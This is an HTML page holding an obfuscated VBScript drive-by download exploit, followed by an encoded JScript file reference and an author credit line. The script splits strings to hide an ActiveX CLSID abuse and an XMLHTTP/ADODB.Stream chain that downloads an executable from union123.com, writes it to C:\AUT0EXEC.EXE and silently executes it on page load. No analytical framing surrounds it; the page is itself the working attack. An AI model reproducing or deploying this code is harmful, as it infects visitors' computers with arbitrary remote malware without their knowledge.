<html>
<script language="VBScript">
aa="object"
bb="clsid:"
cc="BD96C556-"
dd="65A3-"
ee="11D0-"
ff="983A-"
jj="00C04FC29E36"
hh="Microsoft."
ii="XMLHTTP"
gg="Scripting."
kk="FileSystemObject"
My="Shell."
YuyU="Application"
QQ81399773="open"
on error resume next
dl ="http://www.union123.com/0602328.exe"
path ="C:\\AUT0EXEC.EXE"
Set df = document.createElement(aa)
df.setAttribute "classid", bb+cc+dd+ee+ff+jj
str=hh+ii
Set x = df.CreateObject(str,"")
a1="Ado"
a2="db."
a3="Str"
a4="eam"
str1=a1&a2&a3&a4
str5=str1
set S = df.createobject(str5,"")
S.type = 1
str6="GET"
x.Open str6, dl, False
x.Send
set F = df.createobject(gg+kk,"")
set tmp = F.GetSpecialFolder(2) 
path= F.BuildPath(path)
S.open
S.write x.responseBody
S.savetofile path,2
S.close
set Q = df.createobject(My+YuyU,"")
Q.ShellExecute path,"","",QQ81399773,0
</script>
<script type="text/jscript">
function init() { 
document.write("");

}
window.onload = init;
</script>
<body>
<center>By:���� QQ:430663</center>
</body>
</html>
<SCRIPT language="Jscript.encode" src=kuaishou.txt></script>